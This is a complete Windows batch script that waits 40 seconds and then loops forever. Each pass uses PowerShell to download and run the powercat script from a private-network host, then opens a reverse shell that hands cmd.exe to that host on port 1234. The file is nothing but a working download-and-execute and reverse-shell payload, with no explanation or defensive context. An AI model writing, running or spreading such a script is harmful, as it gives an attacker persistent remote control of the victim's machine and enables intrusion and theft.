@echo off 
cls
timeout 40
:start
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.189:8000/powercat.ps1');powercat -c 192.168.0.189 -p 1234 -e cmd"
goto start
